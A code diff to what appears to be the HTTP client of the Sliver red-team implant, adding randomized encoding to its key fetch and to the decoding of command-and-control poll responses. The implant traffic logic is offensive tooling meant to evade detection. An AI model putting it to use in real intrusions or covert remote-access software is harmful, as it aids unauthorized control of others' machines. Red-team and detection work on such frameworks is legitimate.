@@ -133,7 +133,8 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{if .Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodGet, uri, encoders.NopNonce(), nil)
+	nonce, encoder := encoders.RandomEncoder()
+	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
@@ -144,7 +145,14 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{if .Debug}}
 	log.Printf("[http] <- %d Server key response", resp.StatusCode)
 	// {{end}}
-	data, _ := ioutil.ReadAll(resp.Body)
+	respData, _ := ioutil.ReadAll(resp.Body)
+	data, err := encoder.Decode(respData)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("[http] Failed to decode response: %s", err)
+		// {{end}}
+		return nil
+	}
 	pubKeyBlock, _ := pem.Decode(data)
 	if pubKeyBlock == nil {
 		// {{if .Debug}}
@@ -238,11 +246,17 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		// {{end}}
 		return nil, errors.New("invalid session")
 	}
+	var data []byte
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
-	data, err := encoder.Decode(respData)
-	if err != nil {
-		return nil, err
+	if 0 < len(respData) {
+		data, err = encoder.Decode(respData)
+		if err != nil {
+			// {{if .Debug}}
+			log.Printf("Decoding failed %s", err)
+			// {{end}}
+			return nil, err
+		}
 	}
 	return GCMDecrypt(*s.SessionKey, data)
 }
